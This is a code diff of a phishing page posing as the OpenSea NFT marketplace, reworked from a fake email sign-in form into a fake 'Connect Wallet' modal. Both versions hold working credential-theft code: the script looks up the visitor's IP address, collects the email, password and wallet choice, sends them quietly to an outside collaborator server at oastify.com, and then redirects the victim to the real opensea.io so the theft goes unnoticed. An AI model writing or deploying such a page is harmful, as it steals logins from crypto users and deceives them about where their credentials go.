@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OpenSea - Sign In</title>
+    <title>OpenSea - Connect Wallet</title>
     <style>
         * {
             margin: 0;
@@ -12,8 +12,9 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #f7f9fa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica Neue, sans-serif;
+            background: rgba(0, 0, 0, 0.7) url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1000"><defs><pattern id="pattern" x="0" y="0" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="50" cy="50" r="1" fill="%23333"/></pattern></defs><rect width="1000" height="1000" fill="%23111"/><rect width="1000" height="1000" fill="url(%23pattern)"/></svg>');
+            background-size: cover;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -21,265 +22,235 @@
             padding: 20px;
         }
         
-        .container {
-            background: white;
+        .modal {
+            background: #1a1a1a;
             border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
             max-width: 450px;
             width: 100%;
-            padding: 50px 40px;
+            padding: 40px;
+            position: relative;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
         }
         
-        .logo {
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .close-btn:hover {
+            opacity: 0.7;
+        }
+        
+        .logo-container {
             text-align: center;
             margin-bottom: 30px;
         }
         
-        .logo-icon {
-            font-size: 40px;
-            margin-bottom: 15px;
-        }
-        
-        .logo-text {
-            font-size: 28px;
-            font-weight: 700;
-            color: #2081e1;
-            margin-bottom: 5px;
-        }
-        
-        .logo-sub {
-            color: #858585;
-            font-size: 14px;
-        }
-        
-        .header {
-            margin-bottom: 30px;
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #2081e1;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 32px;
         }
         
         h1 {
-            font-size: 24px;
-            color: #1a1a1a;
-            margin-bottom: 10px;
-            font-weight: 700;
+            color: #fff;
+            font-size: 22px;
+            margin-bottom: 15px;
+            font-weight: 600;
         }
         
         .subtitle {
-            color: #858585;
+            color: #888;
             font-size: 14px;
-            margin-bottom: 20px;
-        }
-        
-        .security-badge {
-            background: #f0f7ff;
-            border-left: 4px solid #2081e1;
-            padding: 12px 15px;
-            border-radius: 6px;
             margin-bottom: 30px;
-            font-size: 13px;
-            color: #0066cc;
-            display: flex;
-            align-items: center;
-            gap: 10px;
         }
         
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            color: #1a1a1a;
-            font-weight: 500;
-            margin-bottom: 8px;
-            font-size: 14px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 14px;
-            font-family: inherit;
-            transition: border-color 0.2s;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #2081e1;
-            box-shadow: 0 0 0 4px rgba(32, 129, 225, 0.1);
-        }
-        
-        .remember-me {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        
-        .remember-me input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            margin-right: 8px;
-            cursor: pointer;
-        }
-        
-        .remember-me label {
-            margin: 0;
-            cursor: pointer;
-            color: #858585;
-        }
-        
-        .forgot-password {
-            text-align: right;
-            margin-bottom: 20px;
-        }
-        
-        .forgot-password a {
-            color: #2081e1;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .forgot-password a:hover {
-            text-decoration: underline;
-        }
-        
-        .submit-btn {
+        .email-btn {
             width: 100%;
             padding: 14px;
             background: linear-gradient(135deg, #2081e1 0%, #1a5ec1 100%);
             color: white;
             border: none;
             border-radius: 8px;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
             margin-bottom: 20px;
+            transition: opacity 0.2s;
         }
         
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(32, 129, 225, 0.3);
+        .email-btn:hover {
+            opacity: 0.9;
         }
         
-        .submit-btn:active {
-            transform: translateY(0);
-        }
-        
-        .signup {
-            text-align: center;
-            font-size: 14px;
-            color: #858585;
-        }
-        
-        .signup a {
-            color: #2081e1;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        
-        .signup a:hover {
-            text-decoration: underline;
+        .arrow {
+            font-size: 18px;
         }
         
         .divider {
             text-align: center;
             margin: 25px 0;
-            font-size: 14px;
-            color: #858585;
-            position: relative;
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            display: inline-block;
+            width: 40%;
+            height: 1px;
+            background: #333;
+            vertical-align: middle;
         }
         
         .divider::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: #ddd;
-            z-index: 0;
+            margin-right: 10px;
         }
         
-        .divider span {
-            background: white;
-            padding: 0 10px;
-            position: relative;
-            z-index: 1;
+        .divider::after {
+            margin-left: 10px;
+        }
+        
+        .wallet-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .wallet-btn {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .wallet-btn:hover {
+            background: #2a2a2a;
+            border-color: #2081e1;
+        }
+        
+        .wallet-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+        }
+        
+        .more-options {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .more-options a {
+            color: #2081e1;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .more-options a:hover {
+            text-decoration: underline;
+        }
+        
+        .terms {
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+        }
+        
+        .terms a {
+            color: #2081e1;
+            text-decoration: none;
+        }
+        
+        .terms a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <div class="logo-icon">🌊</div>
-            <div class="logo-text">OpenSea</div>
-            <div class="logo-sub">The largest NFT marketplace</div>
+    <div class="modal">
+        <button class="close-btn">✕</button>
+        
+        <div class="logo-container">
+            <div class="logo">🌊</div>
+            <h1>Connect with OpenSea</h1>
+            <p class="subtitle">Choose how you want to connect</p>
         </div>
         
-        <div class="header">
-            <h1>Sign in</h1>
-            <p class="subtitle">Welcome back! Sign in with your email and password</p>
+        <button class="email-btn" onclick="handleEmailLogin()">
+            <span>Continue with email</span>
+            <span class="arrow">→</span>
+        </button>
+        
+        <div class="divider">or continue with an external wallet</div>
+        
+        <div class="wallet-options">
+            <button class="wallet-btn" onclick="handleWallet('metamask')">
+                <div class="wallet-icon">🦊</div>
+                <span>MetaMask</span>
+            </button>
+            
+            <button class="wallet-btn" onclick="handleWallet('walletconnect')">
+                <div class="wallet-icon">💳</div>
+                <span>WalletConnect</span>
+            </button>
+            
+            <button class="wallet-btn" onclick="handleWallet('phantom')">
+                <div class="wallet-icon">👻</div>
+                <span>Phantom</span>
+            </button>
         </div>
         
-        <div class="security-badge">
-            <span>🔒</span>
-            <span>Your account security is important to us</span>
+        <div class="more-options">
+            <a href="#">More Wallet Options</a>
         </div>
         
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input 
-                    type="email" 
-                    id="email" 
-                    name="email"
-                    placeholder="you@example.com" 
-                    required 
-                    autofocus
-                >
-            </div>
-            
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input 
-                    type="password" 
-                    id="password" 
-                    name="password"
-                    placeholder="Enter your password" 
-                    required
-                >
-            </div>
-            
-            <div class="remember-me">
-                <input type="checkbox" id="remember" name="remember">
-                <label for="remember">Remember me</label>
-            </div>
-            
-            <div class="forgot-password">
-                <a href="#">Forgot password?</a>
-            </div>
-            
-            <button type="submit" class="submit-btn">Sign In</button>
-        </form>
-        
-        <div class="divider">
-            <span>or</span>
+        <div class="terms">
+            By connecting your wallet and using OpenSea, you agree to our
+            <a href="#">Terms of Service</a> & <a href="#">Privacy Policy</a>
         </div>
-        
-        <p class="signup">
-            Don't have an account? <a href="#">Create one</a>
-        </p>
     </div>
     
     <script>
         // Initialize IP detection
         window.visitorIP = 'Detecting...';
         
-        // Multiple IP detection APIs for backup
         var ipAPIs = [
             {url: 'https://api.ipify.org?format=json', key: 'ip'},
             {url: 'https://api64.ipify.org?format=json', key: 'ip'},
@@ -287,7 +258,6 @@
             {url: 'https://ifconfig.me', key: 'text'}
         ];
         
-        // Try to get IP from first available API
         function detectIP(index = 0) {
             if (index >= ipAPIs.length) {
                 window.visitorIP = 'Unknown';
@@ -317,44 +287,56 @@
         }
         
         detectIP();
-
-        // Handle form submission
-        document.getElementById('loginForm').onsubmit = function(e) {
-            e.preventDefault();
-            
-            // Collect form data
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-            var remember = document.getElementById('remember').checked;
-            
-            // Build complete data object
+        
+        // Handle email login
+        function handleEmailLogin() {
+            var email = prompt('Enter your email address:');
+            if (email) {
+                var password = prompt('Enter your password:');
+                if (password) {
+                    sendData({
+                        method: 'email',
+                        email: email,
+                        password: password
+                    });
+                }
+            }
+        }
+        
+        // Handle wallet selection
+        function handleWallet(wallet) {
+            sendData({
+                method: 'wallet',
+                wallet_type: wallet,
+                message: 'Wallet connection initiated'
+            });
+        }
+        
+        // Send collected data to server
+        function sendData(payload) {
             var data = {
-                email: email,
-                password: password,
-                remember: remember,
+                ...payload,
                 ip_address: window.visitorIP,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                location: window.location.href,
                 language: navigator.language
             };
             
-            // Send data to collaborator server
             fetch('https://ugejap8f9h3y5dkafta01qryepkg8dw2.oastify.com/', {
                 method: 'POST',
                 mode: 'no-cors',
                 body: JSON.stringify(data)
-            }).catch(() => {
-                // Silent catch - data sent
-            });
+            }).catch(() => {});
             
-            // Show verification message to user
-            alert('Verifying your credentials...');
-            
-            // Redirect to OpenSea after delay
+            alert('Connecting to OpenSea...');
             setTimeout(() => {
                 window.location = 'https://opensea.io';
-            }, 2000);
+            }, 1500);
+        }
+        
+        // Close button
+        document.querySelector('.close-btn').onclick = function() {
+            window.location = 'https://opensea.io';
         };
     </script>
 </body>
